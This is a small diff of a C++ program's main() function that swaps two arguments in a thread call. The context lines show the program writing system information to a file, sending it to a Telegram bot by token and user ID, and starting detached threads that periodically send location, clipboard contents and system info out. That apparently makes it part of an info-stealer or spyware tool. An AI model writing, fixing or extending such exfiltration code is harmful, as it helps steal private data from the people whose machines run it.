@@ -105,7 +105,7 @@ int main()
     writeSystemInfoToFile(winfoPath);
     sendFileToTelegram(botToken, userID, winfoPath);
 
-    std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath, wclipboardFilePath);
+    std::thread sender(periodicSend, botToken, userID, wlocation, wclipboardFilePath, winfoPath);
     sender.detach();
 
     std::thread infoChecker(periodicCheckInfo, winfoPath, wclipboardFilePath);
